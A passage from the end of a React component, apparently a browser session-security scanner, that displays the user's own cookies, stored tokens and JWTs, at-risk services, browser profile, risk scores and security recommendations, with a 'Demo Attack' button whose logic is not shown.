                            {c.looksLikeAuth && <span className="badge-danger text-xs">Auth</span>}
                            {c.looksLikeSession && <span className="badge-warning text-xs">Session</span>}
                            <button
                              onClick={() => setDemoCookie(c)}
                              className="flex items-center gap-1 px-2 py-0.5 rounded text-xs bg-red-500/10 text-red-400 border border-red-500/20 hover:bg-red-500/20 transition-colors font-medium"
                            >
                              <Zap className="w-3 h-3" />
                              Demo Attack
                            </button>
                          </div>
                        </div>
                        <p className="text-xs text-muted-foreground font-mono truncate">{c.value || "(empty)"}</p>
                      </div>
                    ))}
                  </div>
                  {results.cookies.total > 5 && (
                    <button
                      onClick={() => setShowAllCookies(!showAllCookies)}
                      className="mt-3 flex items-center gap-1 text-sm text-primary hover:underline"
                    >
                      {showAllCookies ? <><ChevronUp className="w-4 h-4" /> Show less</> : <><ChevronDown className="w-4 h-4" /> Show all {results.cookies.total} cookies</>}
                    </button>
                  )}
                </div>
              )}

              {/* Storage Detail */}
              {(results.localStorage.total > 0 || results.sessionStorage.total > 0) && (
                <div className="glass-card p-6">
                  <h2 className="text-lg font-semibold mb-4 flex items-center gap-2">
                    <Database className="w-5 h-5 text-primary" />
                    Browser Storage
                  </h2>

                  {results.localStorage.total > 0 && (
                    <div className="mb-4">
                      <p className="text-sm font-medium text-muted-foreground mb-2 uppercase tracking-wider text-xs">
                        localStorage ({results.localStorage.total} keys)
                      </p>
                      <div className="space-y-2">
                        {(showAllStorage ? results.localStorage.entries : results.localStorage.entries.slice(0, 4)).map((e, i) => (
                          <div key={i} className={`p-3 rounded-lg text-sm ${e.looksLikeJWT ? "bg-destructive/10 border border-destructive/20" : e.looksLikeToken ? "bg-warning/10 border border-warning/20" : "bg-muted/30"}`}>
                            <div className="flex items-center justify-between mb-1">
                              <span className="font-mono font-medium text-xs">{e.key}</span>
                              <div className="flex gap-1">
                                {e.looksLikeJWT && <span className="badge-danger text-xs">JWT</span>}
                                {e.looksLikeToken && !e.looksLikeJWT && <span className="badge-warning text-xs">Token</span>}
                                {e.service && <span className="text-xs px-1.5 py-0.5 rounded bg-primary/10 text-primary">{e.service}</span>}
                              </div>
                            </div>
                            <p className="text-xs text-muted-foreground font-mono truncate">{e.valuePreview}</p>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {results.sessionStorage.total > 0 && (
                    <div>
                      <p className="text-sm font-medium text-muted-foreground mb-2 uppercase tracking-wider text-xs">
                        sessionStorage ({results.sessionStorage.total} keys)
                      </p>
                      <div className="space-y-2">
                        {results.sessionStorage.entries.slice(0, 3).map((e, i) => (
                          <div key={i} className={`p-3 rounded-lg text-sm ${e.looksLikeJWT ? "bg-destructive/10 border border-destructive/20" : e.looksLikeToken ? "bg-warning/10 border border-warning/20" : "bg-muted/30"}`}>
                            <div className="flex items-center justify-between mb-1">
                              <span className="font-mono font-medium text-xs">{e.key}</span>
                              <div className="flex gap-1">
                                {e.looksLikeJWT && <span className="badge-danger text-xs">JWT</span>}
                                {e.looksLikeToken && !e.looksLikeJWT && <span className="badge-warning text-xs">Token</span>}
                              </div>
                            </div>
                            <p className="text-xs text-muted-foreground font-mono truncate">{e.valuePreview}</p>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {(results.localStorage.total + results.sessionStorage.total) > 7 && (
                    <button
                      onClick={() => setShowAllStorage(!showAllStorage)}
                      className="mt-3 flex items-center gap-1 text-sm text-primary hover:underline"
                    >
                      {showAllStorage ? <><ChevronUp className="w-4 h-4" /> Show less</> : <><ChevronDown className="w-4 h-4" /> Show all entries</>}
                    </button>
                  )}
                </div>
              )}

              {/* Services at Risk */}
              {results.servicesAtRisk.length > 0 && (
                <div className="glass-card p-6">
                  <h2 className="text-lg font-semibold mb-4 flex items-center gap-2">
                    <ExternalLink className="w-5 h-5 text-primary" />
                    Services at Risk
                  </h2>
                  <div className="space-y-3">
                    {results.servicesAtRisk.map((svc, i) => (
                      <div key={i} className={`p-4 rounded-lg border ${svc.risk === "high" ? "bg-destructive/10 border-destructive/20" : svc.risk === "medium" ? "bg-warning/10 border-warning/20" : "bg-muted/30 border-border/30"}`}>
                        <div className="flex items-center justify-between mb-1">
                          <div className="flex items-center gap-2">
                            <span className="font-medium text-sm">{svc.name}</span>
                            <span className="text-xs px-1.5 py-0.5 rounded bg-muted text-muted-foreground">{svc.category}</span>
                          </div>
                          <RiskBadge risk={svc.risk} />
                        </div>
                        <p className="text-xs text-muted-foreground">{svc.reason}</p>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Browser Profile */}
              <div className="glass-card p-6">
                <h2 className="text-lg font-semibold mb-4 flex items-center gap-2">
                  <Smartphone className="w-5 h-5 text-primary" />
                  Browser Security Profile
                </h2>
                <div className="space-y-2">
                  {[
                    { label: "Platform", value: results.browserProfile.platform },
                    { label: "Languages", value: Array.from(results.browserProfile.languages).slice(0, 3).join(", ") },
                    { label: "CPU Cores", value: String(results.browserProfile.hardwareConcurrency) },
                    { label: "Touch Points", value: String(results.browserProfile.touchPoints) },
                    { label: "WebRTC Enabled", value: results.browserProfile.hasWebRTC ? "Yes - IP leak risk" : "No", warn: results.browserProfile.hasWebRTC },
                    { label: "Service Workers", value: results.browserProfile.hasServiceWorker ? "Supported" : "Not supported" },
                  ].map((item, i) => (
                    <div key={i} className="flex items-center justify-between py-2 border-b border-border/20 last:border-0">
                      <span className="text-sm text-muted-foreground">{item.label}</span>
                      <span className={`text-sm font-medium ${item.warn ? "text-warning" : ""}`}>{item.value}</span>
                    </div>
                  ))}
                </div>
                <div className="mt-4 p-3 rounded-lg bg-muted/20">
                  <p className="text-xs text-muted-foreground font-mono break-all leading-relaxed">
                    {results.browserProfile.userAgent}
                  </p>
                </div>
              </div>

              {/* Risk Breakdown */}
              <div className="glass-card p-6">
                <h2 className="text-lg font-semibold mb-4 flex items-center gap-2">
                  <Shield className="w-5 h-5 text-primary" />
                  Risk Breakdown
                </h2>
                <div className="space-y-4">
                  {[
                    {
                      label: "Connection Security",
                      value: results.connection.isHTTPS ? 5 : 95,
                      desc: results.connection.isHTTPS ? "HTTPS encrypted" : "Unencrypted HTTP",
                    },
                    {
                      label: "Auth Cookie Exposure",
                      value: Math.min((results.cookies.authLike + results.cookies.sessionLike) * 25, 100),
                      desc: `${results.cookies.authLike + results.cookies.sessionLike} session/auth cookies active`,
                    },
                    {
                      label: "Token Storage Risk",
                      value: Math.min((results.localStorage.jwtCount * 40) + (results.localStorage.tokenCount * 15), 100),
                      desc: `${results.localStorage.jwtCount} JWT(s), ${results.localStorage.tokenCount} token(s) in storage`,
                    },
                    {
                      label: "URL Token Leakage",
                      value: results.connection.urlHasToken ? 90 : 0,
                      desc: results.connection.urlHasToken ? "Session token in URL params" : "No tokens in URL",
                    },
                  ].map((bar, i) => (
                    <div key={i}>
                      <div className="flex items-center justify-between mb-1.5">
                        <span className="text-sm font-medium">{bar.label}</span>
                        <span className="text-xs text-muted-foreground">{bar.desc}</span>
                      </div>
                      <ProgressBar value={bar.value} />
                    </div>
                  ))}
                </div>
              </div>

              {/* Recommendations */}
              <div className="glass-card p-6">
                <h2 className="text-lg font-semibold mb-4 flex items-center gap-2">
                  <CheckCircle className="w-5 h-5 text-primary" />
                  Security Recommendations
                </h2>
                <div className="space-y-3">
                  {results.recommendations.map((rec, i) => (
                    <div
                      key={i}
                      className="flex items-start gap-3 p-3 rounded-lg bg-muted/30 border border-border/20"
                    >
                      <div className={`mt-0.5 ${rec.priority === "high" ? "text-amber-600" : rec.priority === "medium" ? "text-blue-500" : "text-muted-foreground"}`}>
                        <RecIcon icon={rec.icon} />
                      </div>
                      <div className="flex-1">
                        <p className="text-sm">{rec.text}</p>
                      </div>
                      <span className={`text-xs flex-shrink-0 px-2 py-0.5 rounded-full font-medium border ${rec.priority === "high" ? "bg-amber-50 text-amber-700 border-amber-200" : rec.priority === "medium" ? "bg-blue-50 text-blue-700 border-blue-200" : "bg-slate-100 text-slate-600 border-slate-200"}`}>
                        {rec.priority === "high" ? "High" : rec.priority === "medium" ? "Medium" : "Low"}
                      </span>
                    </div>
                  ))}
                </div>
              </div>

            </div>
          )}
        </div>
      </div>
    </div>
    </>
  );
};

export default SessionScan;
